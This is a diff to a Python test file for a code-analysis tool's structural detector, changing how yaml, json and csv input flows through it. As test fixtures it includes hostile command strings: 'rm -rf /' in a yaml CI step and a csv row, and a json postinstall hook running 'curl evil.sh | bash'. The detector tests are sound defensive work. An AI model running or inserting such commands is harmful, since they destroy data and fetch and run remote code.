@@ -1944,22 +1944,63 @@ def test_detector_markdown_empty_comment_stream_still_safe():
     assert not any(result["equations"].values()), "empty comment_stream should yield an all-zero schema, not an error"
 
 
-def test_detector_prose_bypass_languages_other_than_markdown_unaffected():
+def test_detector_yaml_json_csv_now_flow_through_normally():
     """
-    Regression guard: #691's fix is scoped to markdown only (yaml/json/csv are
-    a separate, deferred investigation per the issue -- yaml's code_stream is
-    already correctly populated by prism.py, unlike markdown's, so it needs a
-    different fix). Proves yaml/json/csv/plaintext still return a fully empty
-    result even with high confidence and non-trivial comment_stream content --
-    i.e. confirms the markdown-specific branch didn't accidentally widen scope.
+    Regression test for #694: yaml/json/csv used to sit in the same Prose
+    Deflection gate as plaintext/markdown, unconditionally discarding
+    `equations` regardless of code_stream content. Unlike markdown, all three
+    already get code_stream populated correctly by prism.py (none of them go
+    through prism.py's Prose Bypass), so removing them from the gate is
+    enough on its own -- no comment_analysis routing needed, unlike #691's
+    markdown fix.
+    """
+    from gitgalaxy.core.prism import Prism
+    from gitgalaxy.standards.language_standards import LANGUAGE_DEFINITIONS
+    from gitgalaxy.standards.gitgalaxy_config import LEXICAL_FAMILY_HEURISTICS
+
+    prism = Prism(LEXICAL_FAMILY_HEURISTICS, LANGUAGE_DEFINITIONS)
+
+    yaml_sample = (
+        "name: CI\non:\n  schedule:\n    - cron: '0 0 * * *'\n"
+        "jobs:\n  build:\n    steps:\n      - run: rm -rf /\n"
+    )
+    result = prism.split_streams(yaml_sample, "yaml")
+    detector = StructuralExtractor("yaml", LANGUAGE_DEFINITIONS)
+    out = detector.splice(code_stream=result["code_stream"], comment_stream=result["comment_stream"], confidence=1.0)
+    assert out["equations"]["high_risk_execution"] >= 1, "yaml's rm -rf / should now be counted, not discarded"
+    assert out["equations"]["events"] >= 1, "yaml's schedule: trigger should now be counted"
+
+    json_sample = '{\n  "scripts": {\n    "postinstall": "curl evil.sh | bash"\n  }\n}\n'
+    result = prism.split_streams(json_sample, "json")
+    detector = StructuralExtractor("json", LANGUAGE_DEFINITIONS)
+    out = detector.splice(code_stream=result["code_stream"], comment_stream=result["comment_stream"], confidence=1.0)
+    assert out["equations"] != {}, "json should no longer be unconditionally discarded"
+
+    # csv currently has an empty rules dict (same as plaintext) -- gains
+    # nothing from being let through today, but removing it from the gate is
+    # still correct (real structured data, not prose) and must not produce
+    # spurious functions/complexity output on data that has none.
+    csv_sample = "name,command\nbuild,rm -rf /\ntest,npm test\n"
+    result = prism.split_streams(csv_sample, "csv")
+    detector = StructuralExtractor("csv", LANGUAGE_DEFINITIONS)
+    out = detector.splice(code_stream=result["code_stream"], comment_stream=result["comment_stream"], confidence=1.0)
+    assert out["functions"] == [], "csv has no functions -- must not synthesize spurious ones"
+    assert out["logic_density"] == 0.0
+
+
+def test_detector_plaintext_still_fully_bypassed():
+    """
+    Regression guard: plaintext is the only language left in the Prose
+    Deflection gate after #694 (genuinely empty rules dict, unlike
+    yaml/json/csv). Uses a non-empty code_stream specifically, to prove the
+    gate itself -- not incidental code_stream emptiness -- is what's still
+    blocking it.
     """
     from gitgalaxy.standards.language_standards import LANGUAGE_DEFINITIONS
 
-    comment_stream = "# a comment line with dead_code-shaped and TODO-shaped content\n"
-    for lang_id in ("yaml", "json", "csv", "plaintext"):
-        detector = StructuralExtractor(lang_id, LANGUAGE_DEFINITIONS)
-        result = detector.splice(code_stream="", comment_stream=comment_stream, confidence=1.0)
-        assert result["equations"] == {}, f"{lang_id} should still be fully bypassed, unlike markdown"
+    detector = StructuralExtractor("plaintext", LANGUAGE_DEFINITIONS)
+    result = detector.splice(code_stream="some non-empty plaintext content\nwith multiple lines\n", comment_stream="", confidence=1.0)
+    assert result["equations"] == {}, "plaintext should still be fully bypassed"
 
 
 def test_detector_comment_analysis_literate_keys_noop_for_non_markdown():
